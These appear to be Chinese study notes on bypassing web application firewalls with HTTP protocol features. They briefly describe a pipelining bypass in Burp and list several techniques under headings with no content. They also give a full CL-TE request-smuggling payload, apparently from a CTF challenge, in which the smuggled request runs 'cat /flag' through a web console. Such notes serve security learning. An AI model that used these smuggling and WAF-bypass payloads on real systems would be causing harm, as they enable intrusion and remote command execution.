# pipline 隧道传输绕过
## 原理
HTTP 协议是由 TCP 协议封装而来，当浏览器发起一个 HTTP 请求时，浏览器先和服务器建立起连接 TCP 连接，然后发送 HTTP 数据包（即我们用burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，Apache 等 WEB 容器根据这个字段决定是保持该 TCP 连接或是断开。当发送的内容太大，超过一个 HTTP 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的 HTTP 请求所建立的 TCP 连接不断开，直到所发送内容结束 Connection 为 close 为止。
## 操作
- 关闭 burp 中 Repeater 模块的 Content-Length 自动更新
- 将下一份数据包直接加在上一份参数的后面
![](attachment/Pasted%20image%2020230225213026.png)
# chunked分块绕过
# Content-Type协议未覆盖绕过
# Content-Type协议未覆盖绕过+chunked分块绕过组合技
# 协议未覆盖绕过进阶技——fliename 混淆伪装绕过
# filename混淆绕过
# ATS HTTP走私

用CL-TE的方法走私

所谓`CL-TE`，就是当收到存在两个请求头的请求包时，前端代理服务器只处理`Content-Length`这一请求头，而后端服务器会遵守`RFC2616`的规定，忽略掉`Content-Length`，处理`Transfer-Encoding`
这一请求头

```
POST / HTTP/1.1
Host: e4550371bc.showhub.d3ctf.io
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8e7cipookibqvk2c3govosvfms
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 660
Transfer-Encoding: chunked

0

POST /WebConsole/exec HTTP/1.1
Host: e4550371bc.showhub.d3ctf.io
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer:  http://ec057b43d9.showhub.d3ctf.io/WebConsole/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8e7cipookibqvk2c3govosvfms
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

cmd=cat+/flag&a=
```
[(70条消息) 基于HTTP协议特性绕过WAF的技巧_Tr0e的博客-CSDN博客_http 402包装绕过waf](https://blog.csdn.net/weixin_39190897/article/details/113097805)